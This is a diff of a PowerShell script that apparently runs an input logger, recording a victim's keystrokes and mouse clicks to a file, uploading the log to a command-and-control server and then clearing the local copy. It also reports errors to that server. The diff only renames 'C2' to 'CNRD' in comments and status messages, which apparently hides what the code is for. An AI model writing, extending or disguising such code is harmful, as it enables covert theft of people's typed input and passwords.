@@ -131,7 +131,7 @@ function Start-Logging
 Write-Console -Body ("Input logger starting.") -IssueNumber $issueNumber
 #Write-Host "DEBUG: Input logger starting."
 
-#Upload the input log to C2, then clear it.
+#Upload the input log to CNRD, then clear it.
 try 
 {
     #Write a M1 click to the input file to make sure it exists and we can write to it without issues.
@@ -141,7 +141,7 @@ try
 	If([System.IO.File]::Exists($inputLogPath))
 	{
 		Send-PackageMessage -Package "INPUT" -IssueNumber $issueNumber -Body (Get-Content -Path $inputLogPath -Raw)
-		#Write-Host "DEBUG: Uploaded the input log to C2. Clearing it..."
+		#Write-Host "DEBUG: Uploaded the input log to CNRD. Clearing it..."
 		Clear-Content -Path $inputLogPath
 		Write-Console -Body "Uploaded the input log and cleared it." -IssueNumber $issueNumber
 		#Write-Host "DEBUG: Cleared the old input log."
@@ -157,8 +157,8 @@ try
 catch 
 {
 	Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload the input log file. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to upload the input log file. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to upload the input log file. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to upload the input log file. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to upload the input log file. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
@@ -170,7 +170,7 @@ try
 catch
 {
     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to start the logging function. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to start the logging function. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to start the logging function. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to start the logging function. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to start the logging function. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
